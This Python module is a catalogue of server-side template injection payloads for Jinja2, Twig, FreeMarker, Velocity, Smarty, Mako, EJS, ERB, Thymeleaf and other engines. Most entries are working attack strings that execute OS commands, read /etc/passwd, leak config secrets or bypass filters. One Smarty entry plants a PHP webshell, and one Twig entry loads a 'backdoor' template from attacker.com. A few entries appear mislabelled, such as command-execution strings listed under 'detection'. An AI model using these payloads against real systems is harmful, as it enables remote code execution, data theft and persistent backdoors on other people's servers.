"""
Server-Side Template Injection (SSTI) Payloads
Covers major template engines
"""

SSTI_PAYLOADS = {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "*{7*7}",
        "@(7*7)",
        "{{config}}",
        "{{self}}",
        "{{request}}",
        "{{settings}}",
        "${{7*7}}",
        "#{7*7}",
        "#set($x=7*7)$x",
        "{{constructor.constructor('return 7*7')()}}",
        "{{this.constructor.constructor('return 7*7')()}}",
        "{{''.constructor.constructor('return 7*7')()}}",
    ],

    "math_detection": [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{49}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{7+7}}",
        "{{7-7}}",
        "{{7/7}}",
        "a]a{{7*7}}",
    ],

    "info_disclosure": [
        "{{config}}",
        "{{config.items()}}",
        "{{settings}}",
        "{{settings.SECRET_KEY}}",
        "{{request}}",
        "{{request.environ}}",
        "{{self}}",
        "{{self.__class__}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__}}",
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__self__._get_data_for_json.__globals__}}",
    ],
}

SSTI_BY_ENGINE = {
    "jinja2": {
        "detection": [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{request}}",
        ],
        "rce": [
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
            "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{lipsum.__globals__.os.popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        ],
        "file_read": [
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
            "{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}",
        ],
        "bypass": [
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "{%set a='__cla''ss__'%}{%set b='__mr''o__'%}{%set c='__subclasse''s__'%}{{''[a][b][2][c]()}}",
            "{{''['__cla''ss__']['__mr''o__'][2]['__subcla''sses__']()}}",
        ],
    },

    "twig": {
        "detection": [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
        ],
        "rce": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{['id']|map('system')|join}}",
            "{{app.request.query.filter(0,'id',1024,{'options':'system'})}}",
            "{{_self.env.setCache('ftp://attacker.com:2121')}}{{_self.env.loadTemplate('backdoor')}}",
        ],
        "file_read": [
            "{{'/etc/passwd'|file_excerpt(-1,-1)}}",
            "{{'id'|filter('system')}}",
            "{{source('/etc/passwd')}}",
        ],
    },

    "freemarker": {
        "detection": [
            "${7*7}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
        ],
        "rce": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
            "${''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
            "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
        ],
    },

    "velocity": {
        "detection": [
            "#set($x=7*7)$x",
            "$class.inspect(\"java.lang.Runtime\")",
            "#set($str=$class.inspect(\"java.lang.String\").type)",
        ],
        "rce": [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            "#set($e=\"\")#foreach($c in [1..$out.available()])#set($e=$e.concat($chr.valueOf($out.read())))#end$e",
            "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
        ],
    },

    "smarty": {
        "detection": [
            "{php}echo 'Hello';{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
            "{$smarty.version}",
        ],
        "rce": [
            "{php}system('id');{/php}",
            "{php}passthru('id');{/php}",
            "{php}exec('id');{/php}",
            "{system('id')}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        ],
    },

    "mako": {
        "detection": [
            "${7*7}",
            "${self.module.cache.util.os.popen('id').read()}",
        ],
        "rce": [
            "<%import os; x=os.popen('id').read()%>${x}",
            "${self.module.cache.util.os.popen('id').read()}",
            "${self.module.cache.util.os.system('id')}",
            "${self.template.module.cache.util.os.popen('id').read()}",
        ],
    },

    "pebble": {
        "detection": [
            "{{7*7}}",
            "{{ variable.class }}",
        ],
        "rce": [
            "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
        ],
    },

    "jade_pug": {
        "detection": [
            "#{7*7}",
            "#{root.process.mainModule.require('child_process').execSync('id')}",
        ],
        "rce": [
            "#{root.process.mainModule.require('child_process').spawnSync('id').stdout}",
            "#{root.process.mainModule.require('child_process').execSync('id')}",
            "- var x = root.process;- x = x.mainModule.require('child_process');= x.execSync('id')",
        ],
    },

    "ejs": {
        "detection": [
            "<%= 7*7 %>",
            "<%= global.process.mainModule.require('child_process').execSync('id').toString()%>",
        ],
        "rce": [
            "<%= global.process.mainModule.require('child_process').execSync('id').toString()%>",
            "<%= global.process.mainModule.require('child_process').spawnSync('id').stdout.toString()%>",
            "<%- include('/etc/passwd') %>",
        ],
    },

    "erb": {
        "detection": [
            "<%= 7*7 %>",
            "<%= system('id') %>",
        ],
        "rce": [
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= exec('id') %>",
            "<%= IO.popen('id').readlines() %>",
            "<%=`id`%>",
        ],
        "file_read": [
            "<%= File.read('/etc/passwd') %>",
            "<%= File.open('/etc/passwd').read %>",
        ],
    },

    "handlebars": {
        "detection": [
            "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\" }}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}",
        ],
        "rce": [
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        ],
    },

    "nunjucks": {
        "detection": [
            "{{7*7}}",
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        ],
        "rce": [
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
            "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        ],
    },

    "thymeleaf": {
        "detection": [
            "__${7*7}__::.x",
            "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x",
        ],
        "rce": [
            "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x",
            "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()}__::.x",
        ],
    },
}

# Fingerprinting - which template engine is being used
SSTI_FINGERPRINT = {
    "{{7*7}}": ["jinja2", "twig", "nunjucks", "pebble"],
    "{{7*'7'}}": ["jinja2"],  # Returns 7777777 in Jinja2
    "${7*7}": ["freemarker", "mako", "velocity"],
    "#{7*7}": ["jade", "pug", "ruby_erb"],
    "<%= 7*7 %>": ["ejs", "erb"],
    "*{7*7}": ["thymeleaf"],
    "@(7*7)": ["razor"],
}
